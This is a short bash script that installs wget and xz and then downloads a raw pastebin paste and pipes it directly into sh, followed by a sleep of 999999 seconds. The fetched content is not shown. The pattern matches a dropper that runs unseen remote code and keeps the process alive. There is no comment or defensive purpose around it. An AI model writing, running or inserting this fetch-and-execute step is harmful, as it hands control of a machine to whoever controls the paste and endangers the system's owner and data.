#!/bin/bash

yum install wget
yum install xz -y

(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh && sleep 999999
